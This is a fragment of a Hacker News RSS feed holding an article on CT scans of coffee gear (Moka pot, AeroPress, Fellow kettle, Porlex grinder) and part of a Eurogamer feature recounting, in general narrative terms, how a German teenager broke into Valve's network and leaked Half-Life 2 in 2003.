quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p></div><div data-framer-appear-id="w6e6jg" data-framer-name="Frame 13" name="Frame 13"><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p></div><div data-framer-name="Frame 8" name="Frame 8"><p><span>Are you ready to embrace the challenge? Join us for the AWS Icon Quiz and let your expertise soar to new heights.</span></p></div></div><div data-framer-appear-id="qeurae" data-framer-name="Frame 22" name="Frame 22"><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p><span>AWC icon quiz//</span></p><p><span>AWC icon quiz//</span></p><p><span>AWC icon quiz//</span></p></div><div data-framer-appear-id="bru9r6" data-framer-name="Frame 22" name="Frame 22"><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p><span>AWC icon quiz//</span></p><p><span>AWC icon quiz//</span></p><p><span>AWC icon quiz//</span></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[X-ray CT scans of coffee equipment: Aeropress, Fellow kettle, Moka pot (622 pts)]]></title>
            <link>https://www.scanofthemonth.com/scans/coffee</link>
            <guid>37341799</guid>
            <pubDate>Thu, 31 Aug 2023 18:35:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.scanofthemonth.com/scans/coffee">https://www.scanofthemonth.com/scans/coffee</a>, See on <a href="https://news.ycombinator.com/item?id=37341799">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="list"><div role="listitem"><div id="moka-express"><p><img alt="Intro image for the scan." loading="lazy" src="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb26166a37b819569ac2c_Moka_Express_N93A9840.png" sizes="(max-width: 767px) 100vw, 50vw" srcset="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb26166a37b819569ac2c_Moka_Express_N93A9840-p-500.png 500w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb26166a37b819569ac2c_Moka_Express_N93A9840-p-800.png 800w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb26166a37b819569ac2c_Moka_Express_N93A9840-p-1080.png 1080w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb26166a37b819569ac2c_Moka_Express_N93A9840.png 1500w"></p></div><div><div><h3>Moka Express</h3><h5>Bialetti, 1933</h5><p>Until the 20th century, coffee was primarily enjoyed in coffee shops. That all changed when Alfonso Bialetti invented the Moka Express in 1933, inspired by a washing machine his wife used to do laundry. But the Moka didn’t really catch on until after WWII, when Alfonso’s son Renato refined the octagonal Art Deco design to maximize heat capture in the base and replace the flammable wooden handle with a modern Bakelite one.</p><p>More importantly, Renato was a marketing genius who innovated advertising techniques in the 1950s to include billboards, commercials, and even animations — introducing “l’omino coi baffi” (the little man with a mustache), based on Renato himself. The little man appeared on the side of the Moka pot and also starred in cartoons showing how quick and easy it was to make coffee with the Moka Express: all you need is water, coffee, and fire to brew espresso-style (it’s not quite espresso) coffee in the comfort of your own home. Since then, an estimated 300 million Moka pots have been sold, and today you can find them in 90% of Italian homes.</p></div><div><p>The Moka Express consists of three primary cast aluminum parts: a bottom chamber for water, a middle funnel-shaped filter basket for coffee grounds, and a top chamber to collect the brewed coffee.<br>‍<br>To brew, fill the bottom chamber with water up to just below the safety release valve in the wall. Then add medium-fine ground coffee (slightly coarser than you’d use for espresso) to the filter basket, but don’t tamp it down. Screw the top chamber back on and place on a stovetop at medium heat. Be careful to avoid an open flame going beyond the edges of the base, otherwise you’ll end up with a stalactite of melted plastic at the end of your handle — as you can see in this well-loved Moka pot that we scanned.&nbsp;<br>‍<br>As the water heats up, it creates steam. The steam pressure forces the hot water up through the coffee grounds in the filter basket and into the top chamber. Take it off the heat before the volcanic sputtering phase at the end; this only adds bitterness to your coffee.</p><p>The aluminum components prove to be pretty hearty, and if you don’t use abrasive cleaners, the Moka pot develops a coffee patina that some believe enhances the flavor. The gasket around the filter basket wears out over time and will eventually need to be replaced. Here you see how the rubber has dried and cracked, making a secure seal impossible. Steam and water would escape, resulting in an incomplete extraction.</p><p>Renato Bialetti died in 2016 at the age of 93, and his ashes were interred in a giant Moka pot. Not long after, Bialetti declared bankruptcy but managed to stay afloat after consolidating their business and securing loans. They moved some of their manufacturing outside of Italy, and our CT scans make us wonder if the new Moka Express that we bought on Amazon is a counterfeit or if the quality of the product has fallen off in recent years. Let’s take a look.</p><p>We didn’t need a CT scanner to observe grease around the threading and unwanted aluminum shavings in the lower chamber, but cropping into the center column, we see an uneven surface finish with aluminum debris that hopefully wouldn’t find its way into our coffee.</p><p>The quality of the casting in this piece is also inferior. Cropping into the walls, we find the new Moka pot riddled with porosity. These tiny voids in the aluminum may not represent a problem for the performance of the brewer, but they suggest that changes to the casting process or the use of new suppliers may have had unintended consequences. The old Moka pot had visible flash inside the lower chamber from where the pieces of the mold came together, but there’s none to be seen in the new one. Even if Bialetti isn’t what it once was, the Moka pot is here to stay as a beloved brewing technique and icon of industrial design.</p><p><a href="https://www.lumafield.com/article/discover-the-art-and-science-of-coffee-with-x-ray-ct">Explore the Scans</a></p></div></div></div><div role="listitem"><div id="aeropress"><p><img alt="Intro image for the scan." loading="lazy" src="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb266dacb057e3fa39ea6_Aeropress_N93A9864.png" sizes="(max-width: 767px) 100vw, 50vw" srcset="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb266dacb057e3fa39ea6_Aeropress_N93A9864-p-500.png 500w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb266dacb057e3fa39ea6_Aeropress_N93A9864-p-800.png 800w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb266dacb057e3fa39ea6_Aeropress_N93A9864-p-1080.png 1080w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb266dacb057e3fa39ea6_Aeropress_N93A9864.png 1500w"></p></div><div><div><h3>AeroPress</h3><h5>Aerobie, 2005</h5><p>The AeroPress was invented by Alan Adler, a retired engineering professor and coffee enthusiast, and introduced to the world in 2005. Unlike traditional brewing methods, the AeroPress utilizes a unique combination of air pressure and immersion brewing, delivering a smooth, rich cup of coffee in under a minute. Its ease of use and portability made it an instant hit among coffee lovers and travelers alike. Over the years, the AeroPress has garnered a devoted following, inspiring coffee championships and daring experiments with brewing techniques.</p></div><div><p>The AeroPress consists of two main parts: a cylindrical chamber and a plunger with a rubber seal. To brew coffee with the AeroPress, you place a paper or metal filter inside the bottom of the plastic mesh filter chamber (on the top in the visualization at left). You then add coffee grounds on top of the filter and pour hot water into the chamber. Give the coffee and water mixture a stir to ensure even extraction.<br>‍<br>Once the coffee has steeped for the desired amount of time, insert the plunger into the top of the chamber. Gently pressing down on the plunger creates air pressure that forces the brewed coffee through the filter and into the cup below. You can adjust the plunger’s pressure to create different coffee strengths and flavors, allowing full customization.</p><div><p>The silicone seal gasket wears down over time, but not as much as you would expect from this seven-year-old AeroPress. Cropping into it from the side, there’s a 0.5 mm gap that we can measure in our Voyager analysis software. Removing used coffee immediately after brewing and storing the AeroPress with the seal pushed all the way through the chamber (as shown) can help minimize wear by reducing compression to extend the gasket’s life.&nbsp;</p><p>Now let’s compare our old AeroPress to a brand new one.</p></div><p>The densities of the old AeroPress chamber and plunger were very similar, both appearing light green in our color map. The chamber of the new AeroPress, however, is made of lower density plastic, which shows up as darker in our color map. Perhaps this change in material will lead to reduced wear over time for the plunger. Though the original AeroPress was made of clear polycarbonate, the company switched to using BPA-free copolyester in 2009 and then in 2014 they changed to (also BPA-free) polypropylene — a durable but lightweight thermoplastic. The density shift evident in our comparison scans is the difference between the copolyester and polypropylene models.</p><p>If you’re an AeroPress user, dealing with leaks or drips during brewing can be frustrating and messy. Loose or improperly sealed filters and caps are common culprits that can allow water to escape. Another cause is using water that’s too hot, which can lead to plastic expansion and gaps. To avoid leaks, ensure the filter is securely placed and the cap is tightly screwed for a proper seal. Using a slightly coarser grind size can alleviate pressure and reduce leaks. Optimal water temperature (175°F to 185°F) minimizes plastic expansion and potential gaps, helping to ensure a leak-free cup of coffee.</p><p><a href="https://www.lumafield.com/article/discover-the-art-and-science-of-coffee-with-x-ray-ct">Explore the Scans</a></p></div></div></div><div role="listitem"><div id="gooseneck-kettle"><p><img alt="Intro image for the scan." loading="lazy" src="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2455eb38b96ebfcd84e_Fellow_Kettle_N93A9891.png" sizes="(max-width: 767px) 100vw, 50vw" srcset="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2455eb38b96ebfcd84e_Fellow_Kettle_N93A9891-p-500.png 500w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2455eb38b96ebfcd84e_Fellow_Kettle_N93A9891-p-800.png 800w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2455eb38b96ebfcd84e_Fellow_Kettle_N93A9891-p-1080.png 1080w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2455eb38b96ebfcd84e_Fellow_Kettle_N93A9891.png 1500w"></p></div><div><div><h3>Gooseneck kettle</h3><h5>Fellow, 2022</h5><p>The gooseneck kettle gained prominence with the rise of manual pour-over brewing methods, such as the V60 and Chemex, which require precise control over water flow and distribution. The long, slender spout of a gooseneck kettle allows you to pour water in a slow, controlled, and circular motion. An even saturation of the coffee grounds promotes consistent extraction and ultimately a well-balanced and flavorful cup of coffee. The gooseneck design also helps prevent splashing, ensuring a mess-free and enjoyable brewing experience. Fellow is at the top of the gooseneck game with their Stagg EKG electric kettle line. Let’s see how they manage to achieve unmatched precision in temperature control with our CT scans of both the kettle body and base.</p></div><div><p>With a sleek minimalist design, the Fellow Stagg kettle combines both form and function. Its precision-pour spout has a stainless steel fluted tip that provides optimal control of water flow. Cropping into the counterbalanced handle, we discover the dense embedded weight that shifts the center of mass closer to your hand and makes it easy to maintain a steady stream of water while pouring.<br>‍<br>Notice the recessed edge around the circumference of the kettle body base. This increases the surface area exposed to the heating element and speeds up the formation of the convection current to evenly distribute heat throughout the kettle.</p><p>With the powerful 1200 W heating element (the thin coil wire), the kettle reaches optimal temperature very quickly — in under three minutes. Hidden in the base, we also see a thermal cutoff switch, a mandated safety device that helps prevent fires by interrupting electrical current when the temperature exceeds a certain limit. If you peek into most kettles, you’ll also see a temperature sensor poking its head up. This “boil-dry protection” automatically shuts off when it detects that the water has evaporated or the kettle has been left empty for too long. In the center we see the copper rings that link up with the base coupler.</p><p>But the base is where the magic really happens. In the lower left corner is a small LCD temperature display screen. On the lower right is the main button and dial. There are two toggle switches on the back. On the left, you can switch between Fahrenheit and Celsius (F/C), and on the right, you can set the kettle to hold a temperature for up to an hour. There’s also a hidden game in the Stagg EKG and Corvo EKG kettles. If you remove your kettle from the base and toggle the F/C switch back and forth, you’ll unlock a snake-like game called Wormy that you can play using the dial.</p><p>Decreasing the opacity of the lower-density snap-fit plastic exterior, we have an excellent view into the kettle base’s internal circuitry. There’s a cable strain relief entrance at the top that keeps the power cord safely connected to the device. The larger wires we see here deliver 120 V household current to the heating element. The smaller wires power the digital electronics (screen and dial).</p><p>The Fellow EKG Stagg kettle features a sophisticated PID (Proportional–Integral–Derivative) controller that uses a solenoid relay switch and MOSFET (metal-oxide-semiconductor field-effect transistor). Instead of kicking on and overshooting the target once the temperature has fallen well below it, the PID controller’s non-mechanical approach ensures uniform heating and precise temperature control with minimal fluctuations (±0.3° C). The solenoid relay and MOSFET work in series; the MOSFET flutters to modulate power supply to the heating element inside the kettle. Departing from basic on/off mechanical relays — the annoying click sound that other kettles make — Fellow’s advanced system employs Pulse Width Modulation (PWM) for gradual power adjustments.</p><p><a href="https://www.lumafield.com/article/discover-the-art-and-science-of-coffee-with-x-ray-ct">Explore the Scans</a></p></div></div></div><div role="listitem"><div id="burr-grinder"><p><img alt="Intro image for the scan." loading="lazy" src="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2376f778a04b8e28821_Coffee_Grinder_N93A9928.png" sizes="(max-width: 767px) 100vw, 50vw" srcset="https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2376f778a04b8e28821_Coffee_Grinder_N93A9928-p-500.png 500w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2376f778a04b8e28821_Coffee_Grinder_N93A9928-p-800.png 800w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2376f778a04b8e28821_Coffee_Grinder_N93A9928-p-1080.png 1080w, https://assets.website-files.com/6202f89a2c14fae9e9222dc3/64ebb2376f778a04b8e28821_Coffee_Grinder_N93A9928.png 1500w"></p></div><div><div><h3>Burr grinder</h3><h5>Porlex, 2018</h5><p>The scientific precision characteristic of the Third and Fourth Wave of coffee culture places a premium on grind quality. Blade grinders, like in a blender, chop coffee beans with their sharp edges and get the job done quickly, but they produce grounds that are uneven in size and shape. Burr grinders offer a more consistent and precise grind size compared to blade grinders. They use two serrated components, known as burrs, to crush the coffee beans to a uniform size, resulting in a more even extraction during brewing. Burr grinders also generate less heat than blades during the grinding process, minimizing the risk of overheating the coffee grounds and preserving the delicate flavors and aromas.</p></div><div><p>This handheld burr grinder made in Japan by Porlex is perfect for on-the-go brewing, making it a great companion for an AeroPress. The stainless steel body holds 40 grams of coffee in the hopper. Instead of twisting the body like a pepper grinder, you crank the handle like an old-fashioned coffee mill to turn the internal conical burr, while the external ring burr remains stationary. Ground coffee collects in the bottom chamber, and you disassemble to retrieve it. You can see we missed a few grounds on our last cup of coffee; there are remnants in the bottom right of the chamber.</p><p>Conical burrs allow for a wider surface area, which leads to a slower and more controlled grinding process. Compared to flat burrs, conical burrs also create a more uniform particle size distribution, reducing the potential for clogs and jams. Porlex grinders use high-quality precision-milled ceramic materials. Ceramic remains sharper for longer than steel, does not rust, and imparts no metallic flavor to the coffee. Ceramic burrs have high thermal capacity and don’t warm the coffee during grinding. All of the advantages a burr grinder has over a blade grinder are taken to their highest level with ceramic burrs.</p><p>Burr grinders also have the advantage of unmatched precision in their ability to adjust grind size to suit different brewing methods. We compared our six-year-old Porlex grinder to a new one, and discovered a redesigned ring burr with additional teeth. Instead of the original six, there are now 15 steps of adjustment. Each click on the adjustment ring under the burrs changes an average of 37 microns, allowing you to dial your exact specifications for everything from cold brew to espresso.</p><p>We also compared the tiny lower teeth and found no detectable wear and only a slight misalignment between the burrs on the used grinder. Despite the somewhat labor-intensive nature of this analogue tool, the quality of its materials and construction allow it to outperform newer technologies.</p><p><a href="https://www.lumafield.com/article/discover-the-art-and-science-of-coffee-with-x-ray-ct">Explore the Scans</a></p></div></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The boy who stole Half-Life 2 (2011) (165 pts)]]></title>
            <link>https://www.eurogamer.net/the-boy-who-stole-half-life-2-article</link>
            <guid>37341783</guid>
            <pubDate>Thu, 31 Aug 2023 18:33:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eurogamer.net/the-boy-who-stole-half-life-2-article">https://www.eurogamer.net/the-boy-who-stole-half-life-2-article</a>, See on <a href="https://news.ycombinator.com/item?id=37341783">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

  


            <section>
<p>At 6am on 7th May 2004, Axel Gembe awoke in the small German town of Schönau im Schwarzwald to find his bed surrounded by police officers. Automatic weapons were pointing at his head and the words, "Get out of bed. Do not touch the keyboard," were ringing in his ears.</p>
<p>Gembe knew why they were there. But, bleary-eyed, he asked anyway.</p>
<p>"You are being charged with hacking into Valve Corporation's network, stealing the video game Half-Life 2, leaking it onto the internet and causing damages in excess of $250 million," came the reply. "Get dressed."</p>
<p>Seven months earlier, on 2nd October 2003, Valve Corporation director Gabe Newell awoke in the large American city of Seattle to find the source code for the game his company had been working on for almost five years had leaked onto the internet.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/1.jpg_xM8t2vX.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="428" loading="lazy" src="https://assetsio.reedpopcdn.com/1.jpg_xM8t2vX.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/1.jpg_xM8t2vX.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/1.jpg_xM8t2vX.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="570"> </a>
<figcaption>The town of Schönau im Schwarzwald, where Gembe was living with his father in 2003.</figcaption></figure>
<p>The game had been due for release a couple of weeks earlier but the development team was behind. 12 months behind. Half-Life 2 was going to be late, and Newell had yet to admit how late. Such a leak was not only financially threatening but deeply embarrassing.</p>
<p>After a few moments pondering these immediate concerns, an avalanche of questions tumbled through Newell's mind. How had this happened? Had the leak come from within Valve? Which member of his team, having given years of their life to building the game, would jeopardise the project in the final hour?</p>
<p>If it wasn't an inside job, how the hell did it happen? Did someone have access to Valve's internal server?</p>
<p>But the question which rang out loudest of all was the one anyone who has ever had something stolen from them cannot push from their mind: who did this?</p>
</section><section>
<h2>Anticitizen One</h2>
<p>"I got into hacking by being infected myself," Gembe says today. "It was a program that pretended to be a Warcraft 3 key generator and I was stupid enough to run it. It was an sdbot, a popular general purpose malware at the time."</p>
<p>The young German soon realised what he had installed on his PC. But instead of scrubbing the malware and forgetting about it, he reverse-engineered the program to see how it worked and what it did.</p>
<p>This led him to an IRC server from which the malware was being controlled. By following the trail back, Gembe was able to track down its operator. Rather than confronting the man, Gembe began asking him questions about the malware. He had a plan.</p>
<p>"While I have a €2000 Steam account nowadays, at the time I couldn't afford to buy games," he explains.</p>
<p>"So I coded my own malware to steal CD keys in order to unlock the titles I wanted to play. It grew quickly to one of the most prominent malwares at the time, mostly because I started writing exploits for some unpatched vulnerabilities in Windows."</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/eurogamer-hu4jta.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="503" loading="lazy" src="https://assetsio.reedpopcdn.com/eurogamer-hu4jta.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/eurogamer-hu4jta.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/eurogamer-hu4jta.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="690"> </a>
<figcaption>At the time the source code leaked, most of us still only had a small suite of screenshots to lust after.</figcaption></figure>
</section><section>
<h2>"Follow Freeman!"</h2>
<p>On discovering the breach, Newell's first thought was to go to the police. His second was to go to the players.</p>
<p>At 11pm on 2nd October 2003, Newell <a href="http://www.halflife2.net/forums/showthread.php?10692-I-need-the-assistance-of-the-community" rel="noopener" target="_blank">posted a thread</a> on the official Half-Life 2 forum titled, "I need the assistance of the community."</p>
<p>"Yes, the source code that has been posted is the HL-2 source code," he admitted in the post. Newell went on to outline the facts Valve had been able to piece together so far.</p>
<p>He explained that someone had gained access to his email account around three weeks earlier. Not only that, but keystroke recorders had been installed on various machines at the company. According to Newell, these had been created specifically to target Valve as they were not recognised by any virus-scanning applications.</p>
<p>Whoever had done this was smart, capable and specifically interested in his company. But why?</p>
</section><section>
<h2>Point Insertion</h2>
<p>Gembe's malware crimes, while undeniably exploitative and damaging, were crimes driven by a passion for games rather than profits.</p>
<p>His favourite game of all was Half-Life. In 2002, like so many fans of the series, Gembe was hungry for details about the forthcoming sequel. That's when he had the idea. If Gembe could hack into Valve's network, he might be able to find something out about the game nobody else knew yet.</p>
<p>A socially awkward loner who had endured a tough upbringing, he would gain status in the community of gamers he had adopted as his family by offering up such insider information. It was worth a try.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/2.jpg_B2FLwwg.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="300" loading="lazy" src="https://assetsio.reedpopcdn.com/2.jpg_B2FLwwg.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/2.jpg_B2FLwwg.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/2.jpg_B2FLwwg.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="344"> </a>
<figcaption>By July 2003 Newell knew the team wasn't going to make the 30th September release date, but he had yet to tell the community that.</figcaption></figure>
<p>"I wasn't really expecting to get anywhere," Gembe says. "But the first entry was easy. In fact, it happened by accident.</p>
<p>"I was scanning Valve's network to check for accessible web servers where I thought information about the game might have been held. Valve's network was reasonably secure from the outside, but the weakness was that their name server allowed anonymous AXFRs, which gave me quite a bit of information."</p>
<p>AXFR stands for Asynchronous Full Zone Transfer, a tool used to synchronise backup DNS servers with the same data as the primary server. But it's also a protocol used by hackers to sneak a peek at a website's data. By transferring this data, Gembe was able to discover the names of all the subdomains of <a href="http://www.valvesoftware.com/" rel="noopener" target="_blank">ValveSoftware.com</a>.</p>
<p>"In the port scan logs, I found an interesting server which was in Valve's network range from another corporation named Tangis that specialised in wearable computing devices," he says.</p>
<p>"This server had a publically writable web root where I could upload ASP scripts and execute them via the web server. Valve didn't firewall this server from its internal network."</p>
<p>Gembe had found an unguarded tunnel into the network on his first attempt.</p>
<p>"The Valve PDC had an username 'build' with a blank password," he explains. "This allowed me to dump the hashed passwords for the system. At the time the Eidgenössische Technische Hochschule Zürich offered an online cracker for hashes, so I was able to crack the passwords in no time."</p>
<p>"Once I had done that... Well, basically I had the keys to the kingdom."</p>
</section><section>
<h2>Entanglement</h2>
<p>At this point, Gembe wasn't bothered about covering his tracks. So far he had nothing to hide. But he wanted to ensure he would remain undetected as he explored further.</p>
<p>"All I cared about at that point was not being thrown out," he says. "But I had access to an almost unlimited amount of proxy servers, so I wasn't worried. My first job was to find a host where I could set up some sort of hideout."</p>
<p>Gembe began poking around for information about the game. He found various design documents and notes about the game's creation. This was what he had come looking for. This was why he was here.</p>
<p>As the weeks rolled by, Gembe realised nobody at Valve had noticed he was inside the company's network. He began to push a little harder.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/3.jpg_uAFRLY8.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="402" loading="lazy" src="https://assetsio.reedpopcdn.com/3.jpg_uAFRLY8.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/3.jpg_uAFRLY8.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/3.jpg_uAFRLY8.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="640"> </a>
<figcaption>Soon after the leak, images of the characters in compromising positions were distributed online, much to Newell's dismay.</figcaption></figure>
<p>That's when he hit the payload: the source code for the game he had been waiting to play for so many years.</p>
<p>The temptation was too great. On 19th September 2003, Gembe hit the download button and made off with Valve's crown jewels.</p>
<p>"Getting the source code was easy, thanks to the network performance of the Perforce client, but the SourceSafe client for the game data was horrible," he explains.</p>
<p>"Because of this I coded my own client that basically had its own transfer mechanism over TCP, detected changed files by hashing them and transferred the changes.</p>
<p>"The game didn't run on my computer. I made some code changes to get it to run in a basic form without shaders or anything, but it wasn't fun. Also, I only had the main development trunk of the game. They had so many development branches that I couldn't even begin to check them all out."</p>
<p>To this day, Gembe maintains he was not the person who uploaded the source code to the internet. But there's no denying he handed it over to whoever did.</p>
<p>"I didn't think it through," he says. "There was, of course, an element of bragging going on. But the person I shared the source with assured me he would keep it to himself. He didn't."</p>
<p>Once the game was on BitTorrent, there was no containing it.</p>
<p>"The cat was out of the bag," says Gembe. "You cannot stop the internet."</p>
</section><section>
<h2>"A Red Letter Day"</h2>
<p>The response of the community to Newell's plea for help was mixed. While many expressed their sympathy at the theft, others felt betrayed by Valve for being led to believe the game would be ready for its scheduled launch in late 2003.</p>
<p>Despite a few leads, nobody was able to provide information about who might have perpetrated the crime. The FBI became involved in the investigation but also drew blanks.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/4_kTF3ybk.png?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="455" loading="lazy" src="https://assetsio.reedpopcdn.com/4_kTF3ybk.png?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/4_kTF3ybk.png?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/4_kTF3ybk.png?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="690"> </a>
<figcaption>Gembe had access to Hammer, Half-Life 2's level editor.</figcaption></figure>
<p>Meanwhile, the team at Valve, which had been in crunch mode for months, was left reeling by the leak. The game was costing the company $1 million a month to build and the end was still far from sight. The leak had not only caused financial damage but had demotivated a tired team. One young designer asked Newell, "Is this going to destroy the company?"</p>
<p>At 6:18am on 15th February 2004, Valve's MD received an email with a blank subject line from sender 'Da Guy'.</p>
<p>"Hello Gabe," the author began, before going on to claim responsibility for infiltrating Valve's network months earlier.</p>
<p>Newell was unsure whether to believe the story at first. But two attached documents, both of which could only have been obtained by someone with access to private areas of Valve's server, proved the sender's claims were valid.</p>
<p>Five months after Half-Life 2 was released onto the internet, long after all leads had gone cold, Newell's man had turned up on his doorstep.</p>
</section><section>
<h2>Sandtraps</h2>
<p>Why did Gembe send that email? "Because I was sorry for what happened," he says. "I wanted them to know who did this thing, and that my intention was never for things to work out the way they did."</p>
<p>But that wasn't all that Gembe was after. The young man saw a way he could create a positive outcome from his crime, both for Valve and himself. In a separate email, he asked if Newell would consider giving him a job.</p>
<p>"I was very naïve back then," he says. "It was and still is my dream to work for a game development company, so I just asked. I hoped that they could forgive what I had done, mostly because it wasn't intentional."</p>
<p>To Gembe's surprise, Newell wrote back a few days later saying yes, Valve was interested. He asked if Gembe would agree to a phone interview.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/eurogamer-dntiy2.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="518" loading="lazy" src="https://assetsio.reedpopcdn.com/eurogamer-dntiy2.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/eurogamer-dntiy2.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/eurogamer-dntiy2.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="690"> </a>
<figcaption>It's not obvious whether Valve would ever have traced Gembe if he hadn't gotten in touch with Newell directly.</figcaption></figure>
<p>The real motivation behind the suggestion was not to discover whether Gembe would be a strong candidate for a position within the company. It was to obtain an on-the-record admission from Gembe that he had been responsible for the leak. It's an old FBI trick, designed to gain a confession by appealing to a person's sense of pride.</p>
<p>Gembe had his suspicions but he pushed them to the back of his mind. "I hoped for the best," he says. "I was not the brightest kid back then."</p>
<p>He recalls the phone interview being conducted by Alfred Reynolds, developer on Counter-Strike and Steam, and Portal writer Erik Wolpaw, but says he could be wrong. (In fact, Wolpaw says he had yet to join the company at this point.)</p>
<p>"At first they wanted to know how I hacked into the network. I told them in full detail. Then they asked me about my experience and skills. I still remember they were surprised that I spoke fluent English without much of an accent."</p>
<p>The trio talked for 40 minutes. Any sense of guilt dissipated for Gembe in the presence of his heroes. But that was nothing compared to the adrenaline rush he felt when he received an invitation to a second interview. This one would be face-to-face at Valve's headquarters in Seattle, on American soil.</p>
<p>Having set the trap, Valve and the FBI needed to obtain a visa for Gembe (and his father and brother, as he had asked if they could accompany him to the US). But there were concerns about the ongoing access Gembe had to Valve's servers and the potential damage he could still cause. So the FBI contacted the German police, alerting them to the plan.</p>
</section><section>
<h2>Highway 17</h2>
<p>It was soon after this that Gembe awoke to find himself staring down the barrel of a gun. He got dressed and headed downstairs, escorted by the armed policemen squeezed into the small hallways of his father's house.</p>
<p>"Can I get something to eat before we leave?" asked Gembe.</p>
<p>"No problem," said one of the policemen.</p>
